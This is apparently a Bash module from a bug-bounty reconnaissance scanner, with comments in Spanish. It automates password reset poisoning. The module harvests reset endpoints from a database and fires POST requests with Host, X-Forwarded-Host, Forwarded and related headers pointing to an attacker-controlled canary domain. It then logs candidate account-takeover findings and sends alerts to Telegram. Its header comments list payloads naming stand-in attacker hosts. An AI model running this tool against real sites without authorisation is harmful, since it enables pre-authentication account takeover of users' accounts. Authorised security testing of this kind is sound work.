#!/usr/bin/env bash
# ============================================================
#  modules/33_password_reset_poison.sh
#  Fase 33: Password Reset Poisoning via Host Header Injection
#
#  Técnicas:
#    A) Host header override    → Host: attacker.com
#    B) X-Forwarded-Host        → X-Forwarded-Host: attacker.com
#    C) Forwarded               → Forwarded: host=attacker.com
#    D) X-Original-URL          → /password-reset@attacker.com
#    E) Dangling markup         → Host: attacker.com:<script>
#    F) Multiple Host headers   → Host: legit.com / Host: evil.com
#
#  El servidor usa el Host para construir el link de reset en el email.
#  Si refleja el header inyectado → link apunta a dominio del atacante.
#  El usuario hace clic → el token de reset llega al atacante → ATO.
#
#  Referencia: PortSwigger Research — Password Reset Poisoning
#  H1 bounty promedio: $500–$3000 (pre-auth account takeover chain)
# ============================================================

MODULE_NAME="password_reset_poison"
MODULE_DESC="Password Reset Poisoning — Host header injection"

# ── Indicadores de reset de contraseña en la respuesta ───────
_is_reset_response() {
  local BODY="$1"
  echo "$BODY" | grep -qiP \
    'reset|forgot|recover|password.*sent|email.*sent|check.*email|enlace|correo|enviado' \
    && return 0
  return 1
}

# ── Detectar si la respuesta indica error de host ────────────
_is_host_error() {
  local BODY="$1" STATUS="$2"
  # Si el server rechaza con 400/421 o dice "invalid host" → no vulnerable
  [[ "$STATUS" == "400" || "$STATUS" == "421" ]] && return 0
  echo "$BODY" | grep -qiP 'invalid host|bad request|not found|error.*host' && return 0
  return 1
}

# ── Buscar endpoints de password reset ───────────────────────
_find_reset_endpoints() {
  local DOMAIN_ID="$1"
  local OUT_FILE="$2"

  # De login_forms ya detectados por módulo 12
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM login_forms
     WHERE domain_id=${DOMAIN_ID}
     AND (login_type='password_reset'
          OR url LIKE '%forgot%'
          OR url LIKE '%reset%'
          OR url LIKE '%recover%'
          OR url LIKE '%password%')
     LIMIT 20;" 2>/dev/null >> "$OUT_FILE"

  # De URLs crawleadas
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
     AND (url LIKE '%forgot%' OR url LIKE '%reset%password%'
          OR url LIKE '%recover%' OR url LIKE '%lost%password%'
          OR url LIKE '%password%reset%' OR url LIKE '%account%recover%')
     LIMIT 20;" 2>/dev/null >> "$OUT_FILE"

  # Rutas canónicas sobre subdominios alive
  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    for PATH_ in \
      "/forgot-password" "/forgot_password" "/forgotpassword" \
      "/password/reset" "/password/forgot" "/password/recover" \
      "/reset-password" "/reset_password" "/resetpassword" \
      "/account/forgot" "/account/recover" "/account/reset" \
      "/auth/forgot" "/auth/reset" "/auth/password-reset" \
      "/users/password/new" "/users/forgot_password" \
      "/api/v1/auth/forgot" "/api/v1/password/reset" \
      "/api/v2/auth/forgot" "/api/auth/forgot-password"; do
      echo "https://${SUB}${PATH_}" >> "$OUT_FILE"
    done
  done < <(sqlite3 "$DB_PATH" \
    "SELECT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND http_status BETWEEN 200 AND 403
     LIMIT 10;" 2>/dev/null)

  sort -u "$OUT_FILE" -o "$OUT_FILE"
}

# ── Test de un endpoint ───────────────────────────────────────
_test_reset_endpoint() {
  local URL="$1"
  local DOMAIN_ID="$2"
  local DOMAIN="$3"
  local PROXY_FLAG="$4"
  local CANARY="$5"   # dominio controlado por el atacante

  local HOST
  HOST=$(echo "$URL" | grep -oP 'https?://[^/]+' | sed 's|https\?://||')

  # Primero verificar que el endpoint existe y acepta la request
  local ORIG_STATUS ORIG_BODY
  ORIG_STATUS=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 10 \
    -o /tmp/.prp_orig_$$ -w "%{http_code}" \
    -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=probe%40${DOMAIN}&_token=probe" \
    ${PROXY_FLAG} "$URL" 2>/dev/null)
  ORIG_BODY=$(cat /tmp/.prp_orig_$$ 2>/dev/null | head -c 2000)
  rm -f /tmp/.prp_orig_$$

  # Si no existe o es una SPA catch-all, saltar
  [[ "$ORIG_STATUS" == "404" ]] && return 1
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  is_spa_csr_body "$ORIG_BODY" && return 1

  log_info "  🔑 Reset endpoint detectado: $URL ($ORIG_STATUS)"

  local VULN=false VULN_HEADER="" VULN_DETAIL=""

  # ── Técnica A: Host override ──────────────────────────────
  local STATUS_A BODY_A
  STATUS_A=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 10 \
    -o /tmp/.prp_a_$$ -w "%{http_code}" \
    -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Host: ${CANARY}" \
    -d "email=probe%40${DOMAIN}" \
    ${PROXY_FLAG} "$URL" 2>/dev/null)
  BODY_A=$(cat /tmp/.prp_a_$$ 2>/dev/null | head -c 2000)
  rm -f /tmp/.prp_a_$$

  if ! _is_host_error "$BODY_A" "$STATUS_A"; then
    if _is_reset_response "$BODY_A" || [[ "$STATUS_A" == "200" || "$STATUS_A" == "302" ]]; then
      VULN=true; VULN_HEADER="Host: ${CANARY}"; VULN_DETAIL="Host header override → posible poison"
    fi
  fi

  # ── Técnica B: X-Forwarded-Host ──────────────────────────
  if ! $VULN; then
    local STATUS_B BODY_B
    STATUS_B=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 10 \
      -o /tmp/.prp_b_$$ -w "%{http_code}" \
      -X POST -H "Content-Type: application/x-www-form-urlencoded" \
      -H "X-Forwarded-Host: ${CANARY}" \
      -d "email=probe%40${DOMAIN}" \
      ${PROXY_FLAG} "$URL" 2>/dev/null)
    BODY_B=$(cat /tmp/.prp_b_$$ 2>/dev/null | head -c 2000)
    rm -f /tmp/.prp_b_$$

    if ! _is_host_error "$BODY_B" "$STATUS_B"; then
      if _is_reset_response "$BODY_B" || [[ "$STATUS_B" == "200" ]]; then
        VULN=true; VULN_HEADER="X-Forwarded-Host: ${CANARY}"
        VULN_DETAIL="X-Forwarded-Host override → posible poison"
      fi
    fi
  fi

  # ── Técnica C: X-Host / Forwarded ────────────────────────
  if ! $VULN; then
    for HDR in "X-Host: ${CANARY}" "Forwarded: host=${CANARY}" \
               "X-Original-Host: ${CANARY}" "X-Real-Host: ${CANARY}"; do
      local STATUS_C
      STATUS_C=$(curl -sk -A "${SCAN_UA:-Mozilla/5.0}" --max-time 10 \
        -o /dev/null -w "%{http_code}" \
        -X POST -H "Content-Type: application/x-www-form-urlencoded" \
        -H "$HDR" \
        -d "email=probe%40${DOMAIN}" \
        ${PROXY_FLAG} "$URL" 2>/dev/null)
      if [[ "$STATUS_C" == "200" || "$STATUS_C" == "302" ]]; then
        VULN=true; VULN_HEADER="$HDR"
        VULN_DETAIL="Header alternativo acepta host externo"
        break
      fi
    done
  fi

  if $VULN; then
    log_warn "  ⚡ PASSWORD RESET POISON: $URL"
    log_warn "    Header: $VULN_HEADER"
    log_warn "    → Si el email de reset usa el Host para construir el link,"
    log_warn "      el token llega al atacante (Account Takeover pre-auth)"

    local EXISTING
    EXISTING=$(sqlite3 "$DB_PATH" \
      "SELECT COUNT(*) FROM findings
       WHERE domain_id=${DOMAIN_ID} AND target='${URL//\'/\'\'}' AND type='password_reset_poison';" \
      2>/dev/null || echo "1")

    if [[ "${EXISTING:-1}" == "0" ]]; then
      db_add_finding "$DOMAIN_ID" "password_reset_poison" "high" \
        "$URL" "host_header_injection" \
        "Password Reset Poison: $VULN_HEADER → $VULN_DETAIL | Confirmar con email real para verificar reflexión"

      _telegram_send "🔑 *Password Reset Poisoning*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📋 Severidad: \`HIGH\`
🎯 Header: \`${VULN_HEADER}\`
💡 ${VULN_DETAIL}
⚠️ Verificar: enviar reset a cuenta real, comprobar link en email
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
    fi
    return 0
  fi

  return 1
}

module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 33 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  # Dominio canary — idealmente un interactsh/burp collaborator propio
  # Si no hay configurado, usamos uno que al menos detecta respuesta 200
  local CANARY="${POISON_CANARY_DOMAIN:-a.fernandes.es}"

  local TARGETS="$OUT_DIR/.prp_targets.txt"
  > "$TARGETS"
  _find_reset_endpoints "$DOMAIN_ID" "$TARGETS"

  local TOTAL
  TOTAL=$(wc -l < "$TARGETS" | tr -d ' ')

  if [[ "$TOTAL" -eq 0 ]]; then
    log_info "Sin endpoints de password reset detectados — saltando módulo"
    rm -f "$TARGETS"
    return
  fi

  log_info "$TOTAL endpoints de reset candidatos..."

  local FOUND=0
  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    http_should_skip "$URL" 2>/dev/null && continue
    _test_reset_endpoint "$URL" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY" "$CANARY" \
      && ((FOUND++))
  done < "$TARGETS"

  rm -f "$TARGETS"

  if [[ "$FOUND" -eq 0 ]]; then
    log_info "Sin indicadores de host injection en endpoints de reset"
  else
    log_ok "$MODULE_DESC: $FOUND endpoints potencialmente vulnerables"
    log_warn "  ⚠️  VERIFICACIÓN MANUAL REQUERIDA:"
    log_warn "  1. Tener cuenta en el target con email controlado"
    log_warn "  2. Enviar reset con header Host/X-Forwarded-Host: <canary>"
    log_warn "  3. Comprobar que el link del email apunta al dominio canary"
    log_warn "  4. Si sí → ATO pre-auth confirmado, reportar como HIGH/CRITICAL"
  fi
}
